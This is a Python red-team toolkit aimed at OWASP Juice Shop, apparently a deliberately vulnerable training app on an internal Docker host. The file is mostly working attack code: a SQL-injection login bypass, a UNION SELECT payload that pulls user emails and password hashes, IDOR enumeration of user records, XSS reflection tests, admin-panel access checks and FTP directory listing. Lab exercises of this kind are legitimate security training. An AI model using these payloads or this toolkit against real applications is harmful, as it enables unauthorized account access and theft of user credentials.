#!/usr/bin/env python3
"""
Juice Shop Attack Scripts
Red Team Utility Functions
"""

import requests
import json
from colorama import Fore, Style, init

init()

BASE_URL = "http://juice-shop:3000"  # Internal Docker URL

class JuiceShopAttacker:
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.session = requests.Session()
        self.token = None
        
    def print_success(self, msg):
        print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")
        
    def print_error(self, msg):
        print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")
        
    def print_info(self, msg):
        print(f"{Fore.BLUE}[*] {msg}{Style.RESET_ALL}")
        
    def sql_injection_login(self, payload="' OR 1=1--"):
        """Attempt SQL injection on login"""
        self.print_info(f"Attempting SQL injection with: {payload}")
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": payload,
            "password": "anything"
        })
        if "token" in r.text:
            data = r.json()
            self.token = data.get("authentication", {}).get("token")
            email = data.get("authentication", {}).get("umail")
            self.print_success(f"SQL Injection successful! Logged in as: {email}")
            return True
        else:
            self.print_error("SQL Injection failed")
            return False
    
    def enumerate_users(self, max_id=20):
        """Enumerate users via IDOR"""
        self.print_info(f"Enumerating users 1-{max_id}")
        users = []
        headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
        
        for i in range(1, max_id + 1):
            r = self.session.get(f"{self.base_url}/api/Users/{i}", headers=headers)
            if r.status_code == 200:
                user = r.json().get("data", {})
                users.append({
                    "id": user.get("id"),
                    "email": user.get("email"),
                    "role": user.get("role")
                })
                self.print_success(f"User {i}: {user.get('email')}")
        return users
    
    def search_sql_injection(self, payload):
        """SQL injection via search"""
        self.print_info(f"Search SQL injection: {payload}")
        r = self.session.get(f"{self.base_url}/rest/products/search", params={"q": payload})
        return r.json()
    
    def extract_users_via_sqli(self):
        """Extract user data via SQL injection"""
        payload = "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
        self.print_info("Extracting users via SQL injection...")
        r = self.session.get(f"{self.base_url}/rest/products/search", params={"q": payload})
        data = r.json().get("data", [])
        
        for item in data:
            if "@" in str(item.get("name", "")):
                self.print_success(f"User: {item.get('name')} | Hash: {item.get('description')}")
        return data
    
    def test_xss(self, endpoint, param, payload):
        """Test XSS payload"""
        self.print_info(f"Testing XSS on {endpoint}")
        r = self.session.get(f"{self.base_url}{endpoint}", params={param: payload})
        if payload in r.text:
            self.print_success("XSS payload reflected!")
            return True
        return False
    
    def access_admin_panel(self):
        """Check access to admin panel"""
        self.print_info("Checking admin panel access...")
        r = self.session.get(f"{self.base_url}/api/Users", 
                            headers={"Authorization": f"Bearer {self.token}"})
        if r.status_code == 200:
            self.print_success("Admin panel accessible!")
            return True
        self.print_error("Admin panel denied")
        return False
    
    def download_ftp_files(self):
        """List and download FTP files"""
        self.print_info("Accessing /ftp directory...")
        r = self.session.get(f"{self.base_url}/ftp")
        self.print_success("FTP directory accessible")
        print(r.text)
        return r.text


def main():
    print("""
    ╔═══════════════════════════════════════════╗
    ║     JUICE SHOP ATTACK TOOLKIT             ║
    ║     Red Team Exercise Scripts             ║
    ╚═══════════════════════════════════════════╝
    """)
    
    attacker = JuiceShopAttacker()
    
    # Demo attacks
    print("\n=== SQL Injection Demo ===")
    attacker.sql_injection_login()
    
    print("\n=== User Enumeration Demo ===")
    attacker.enumerate_users(5)
    
    print("\n=== FTP Access Demo ===")
    attacker.download_ftp_files()


if __name__ == "__main__":
    main()
